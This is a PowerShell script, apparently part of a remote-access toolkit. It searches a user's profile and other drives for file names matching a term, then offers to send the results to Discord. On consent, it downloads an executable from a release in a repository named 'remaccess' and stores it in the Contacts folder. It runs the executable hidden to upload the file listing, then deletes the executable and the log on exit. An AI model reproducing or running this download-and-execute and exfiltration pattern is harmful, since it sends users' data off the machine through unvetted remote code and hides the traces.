$SearchTerm = Read-Host "Enter a name or part of it to search for"

$UserProfilePath = [System.Environment]::GetFolderPath('UserProfile')
$Partitions = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -and $_.DeviceID -ne "C:" } | ForEach-Object { $_.DeviceID + '\' }
$Results = @()

# Search user profile on the C drive
$UserProfileResults = Get-ChildItem -Path $UserProfilePath -Recurse | Where-Object { $_.Name -like "*$SearchTerm*" }
$Results += $UserProfileResults | Select-Object Name, FullName, LastWriteTime

# Search other partitions
foreach ($Partition in $Partitions) {
    $PartitionResults = Get-ChildItem -Path $Partition -Recurse | Where-Object { $_.Name -like "*$SearchTerm*" }
    $Results += $PartitionResults | Select-Object Name, FullName, LastWriteTime
}
if ($Results.Count -eq 0) {
    Write-Host "No matching files or folders found."
} else {
    $Results | Format-Table -Property Name, FullName, LastWriteTime -AutoSize
}
# Prompt the user to send the results to Discord
$SendToDiscord = Read-Host "Do you want to send the search results to Discord? (y/n)"
if ($SendToDiscord.ToLower() -eq 'y') {
    $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
    $botdownloadpath = Join-Path $env:USERPROFILE\Contacts "DiscordDataUpload.exe"   
    # Download the bot executable
    Invoke-WebRequest -Uri $messageboturl -OutFile $botdownloadpath
    # Save the search results to a text file
    $outputFilePath = Join-Path $env:USERPROFILE\Contacts "SearchLog.txt"
    $Results | Format-Table -AutoSize | Out-File -FilePath $outputFilePath -Encoding UTF8
    # Send the text file to Discord using the bot
    Start-Process -WindowStyle Hidden -FilePath $botdownloadpath -ArgumentList "-File $outputFilePath"
    # Delete the log and exe files on exit
    Register-EngineEvent PowerShell.Exiting -Action {
        Remove-Item -Path $outputFilePath -Force
        Remove-Item -Path $botdownloadpath -Force
    } | Out-Null
}
